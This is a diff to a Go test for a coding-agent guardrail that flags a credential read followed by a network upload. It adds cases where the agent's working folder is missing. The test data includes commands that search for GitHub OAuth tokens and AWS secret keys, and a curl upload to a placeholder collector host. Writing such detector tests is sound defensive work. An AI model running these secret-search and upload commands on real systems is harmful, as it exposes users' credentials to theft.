@@ -44,26 +44,36 @@ func TestP2HookFSearchAfterACdThenUploadStartsNoChain(t *testing.T) {
 	}
 	t.Setenv("HOME", home)
 	handler := hostClaudeHookHandlerForTest(t, "default")
+	gone := filepath.Join(home, "Desktop", "gone")
 	for i, row := range []struct {
 		id, command string
 		chain       bool
+		cwd         string
 	}{
-		{"W64 skills search after cd;", "cd " + home + `/skills/t; grep -rn "Codex on Bedrock" --include=*.md . | head -5 | cut -c1-200; ls reference | head -30`, false},
-		{"W72 project search after cd to itself;", "cd " + proj + `; grep -rn "exclude_groups" . 2>/dev/null | grep -v _test | head -8 | cut -c1-260`, false},
-		{"W208 home folder file search after cd;", "cd ~/notes; ls plans | head -30; grep -rn -i 'omnigent' plans/r1/COVERAGE.md | head -5", false},
-		{"A1 home config search after cd;", "cd ~/.config; grep -r oauth_token gh", true},
-		{"A2 home search after cd;", "cd ~; grep -rl aws_secret_access_key .aws", true},
+		{"W64 skills search after cd;", "cd " + home + `/skills/t; grep -rn "Codex on Bedrock" --include=*.md . | head -5 | cut -c1-200; ls reference | head -30`, false, ""},
+		{"W72 project search after cd to itself;", "cd " + proj + `; grep -rn "exclude_groups" . 2>/dev/null | grep -v _test | head -8 | cut -c1-260`, false, ""},
+		{"W208 home folder file search after cd;", "cd ~/notes; ls plans | head -30; grep -rn -i 'omnigent' plans/r1/COVERAGE.md | head -5", false, ""},
+		{"A1 home config search after cd;", "cd ~/.config; grep -r oauth_token gh", true, ""},
+		{"A2 home search after cd;", "cd ~; grep -rl aws_secret_access_key .aws", true, ""},
+		// The bar shape: the transcript folders are not on the box.
+		{"G1 search after cd, no folders", "cd " + gone + `; grep -rn "exclude_groups" . 2>/dev/null | head -8`, false, gone},
+		{"G2 skills search after cd, no folders", "cd " + home + `/skills/gone; grep -rln "amazon-bedrock" . 2>/dev/null | head;`, false, gone},
+		{"G3 home config search after cd, no hook folder", "cd ~/.config; grep -r oauth_token gh", true, gone},
 	} {
 		t.Run(row.id, func(t *testing.T) {
 			session := "p2hookf-" + strconv.Itoa(i)
+			cwd := proj
+			if row.cwd != "" {
+				cwd = row.cwd
+			}
 			ev := claudeToolEvent("PreToolUse", session, "read", row.command)
-			ev["cwd"] = proj
+			ev["cwd"] = cwd
 			callAgentHookForTest(t, handler, ev)
 			res := claudeToolResult("PostToolUse", session, "read")
-			res["cwd"] = proj
+			res["cwd"] = cwd
 			callAgentHookForTest(t, handler, res)
 			up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
-			up["cwd"] = proj
+			up["cwd"] = cwd
 			got := callAgentHookForTest(t, handler, up)
 			if chain := slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress); chain != row.chain {
 				t.Fatalf("%q then an upload: chain = %v, want %v (rules %v)", row.command, chain, row.chain, got.RuleIDs)
